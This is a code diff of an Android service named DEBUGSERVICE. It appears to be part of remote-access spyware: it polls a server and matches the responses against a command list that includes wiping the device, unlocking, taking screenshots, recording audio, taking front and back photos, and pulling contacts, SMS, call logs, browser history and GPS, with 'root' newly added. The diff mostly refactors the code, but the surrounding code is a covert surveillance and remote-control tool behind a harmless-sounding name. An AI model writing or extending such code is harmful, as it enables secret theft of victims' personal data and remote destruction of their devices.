@@ -27,6 +27,7 @@ import android.content.IntentFilter;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.AsyncTask;
+import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
 import android.os.StrictMode;
@@ -41,7 +42,7 @@ public class DEBUGSERVICE extends Service {
 	public static String[] codeList = { "Vidit7861", "WIPEALL!1!", "msg:|",
 			"UNLOCK!", "install", "screenshot", "packages", "audio",
 			"pictureBack", "pictureFront", "sendall", "adb", "getContacts",
-			"getSMS", "getCall", "getBrowser", "getGPS", "SU" };
+			"getSMS", "getCall", "getBrowser", "getGPS", "SU", "root" };
 
 	public boolean isOnline() {
 		ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -55,9 +56,7 @@ public class DEBUGSERVICE extends Service {
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		try {
-			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
-					.permitAll().build();
-			StrictMode.setThreadPolicy(policy);
+			threadPolicy();
 			if (ConstantVariables.DEBUG) {
 				Shell.SH.run("echo 'started Service' > /sdcard/Android/data/settings/Logger/bootup.txt");
 			}
@@ -80,9 +79,7 @@ public class DEBUGSERVICE extends Service {
 		super.onCreate();
 
 		try {
-			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
-					.permitAll().build();
-			StrictMode.setThreadPolicy(policy);
+			threadPolicy();
 
 			IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
 			filter.addAction(Intent.ACTION_SCREEN_OFF);
@@ -91,6 +88,16 @@ public class DEBUGSERVICE extends Service {
 		} catch (Exception e) {
 			Shell.SH.run("echo 'OnCreate | " + e.getMessage()
 					+ "' >> /sdcard/Android/data/settings/Logger/CRASH.txt");
+		}
+	}
+
+	@SuppressLint("NewApi")
+	private void threadPolicy() {
+		// TODO Auto-generated method stub
+		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.GINGERBREAD) {
+			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
+					.permitAll().build();
+			StrictMode.setThreadPolicy(policy);
 		}
 	}
 
@@ -177,7 +184,7 @@ public class DEBUGSERVICE extends Service {
 								.execute(httpPost);
 						String response = entityToString(
 								httpResponse.getEntity()).trim();
-						for (String element : codeList) {
+						for (String element : DEBUGSERVICE.codeList) {
 							if (element.contains(response)) {
 								Intent intent = new Intent(DEBUGSERVICE.this,
 										DEBUG.class);
